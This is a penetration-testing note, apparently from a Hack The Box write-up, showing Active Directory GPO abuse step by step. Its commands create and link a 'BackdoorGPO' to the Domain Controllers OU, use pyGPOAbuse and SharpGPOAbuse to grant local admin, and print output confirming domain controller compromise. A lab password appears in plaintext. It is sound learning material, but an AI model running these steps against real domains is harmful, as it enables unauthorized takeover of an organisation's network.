**GPO Abuse** is an attack method used in Active Directory environments where an attacker targets Group Policy Objects (GPOs). It works by modifying GPO settings to distribute malicious configurations or scripts, allowing the attacker to gain control over systems or escalate privileges across the network.

In BloodHound, if a user has the `WriteDacl` permission on  a GPO object, they can modify the access controls on that object:

![[Pasted image 20240815224341.png]]
#### Linux

```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git
```

```bash
sudo python3 pygpoabuse.py domain.local/username:password -command 'net localgroup administrators usser /add' -gpo-id {object_id}
```


List all GPOs

```bash
PS C:\Users\M.SchoolBus\Desktop> Get-GPO -All

DisplayName      : Default Domain Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:25:44 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 

DisplayName      : Default Domain Controllers Policy
DomainName       : frizz.htb
Owner            : frizz\Domain Admins
Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2024 7:19:24 AM
ModificationTime : 10/29/2024 7:19:24 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 
```

Create a new GPO:

```bash
PS C:\Users\M.SchoolBus\Desktop> New-GPO -Name "BackdoorGPO"

DisplayName      : BackdoorGPO
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : f8e7b8e1-555f-46e7-b102-dedb9549185c
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 6/17/2025 9:23:10 PM
ModificationTime : 6/17/2025 9:23:10 PM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 
```

Link the GPO to the Domain Controllers OU. If `BackdoorGPO` is linked here and the Domain Controller (e.g. `frizzdc.frizz.htb`) reboots or applies group policy, the GPO will execute with SYSTEM privileges on the Domain Controller.

```bash
PS C:\Users\M.SchoolBus\Desktop> New-GPLink -Name "BackdoorGPO" -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes

GpoId       : a6567a14-30be-463e-b880-a81cfc2321c8
DisplayName : BackdoorGPO
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2

```

The following command modifies the `BackdoorGPO` to add `M.SchoolBus` to the **local Administrators group** on the **Domain Controller**, because the GPO is linked specifically to the `DOMAIN CONTROLLERS` OU.

```bash
PS C:\Users\M.SchoolBus\Desktop> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName BackdoorGPO --force
```

Update GPO on the local system:

```bash
PS C:\Users\M.SchoolBus\Desktop> gpupdate /force
```

Now have administrator access:

```bash
gareth@gareth:~/htb/thefrizz$ nxc smb frizzdc.frizz.htb -u M.SchoolBus -p '!suBcig@MehTed!R' -k 
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\M.SchoolBus:!suBcig@MehTed!R (Pwn3d!)
```
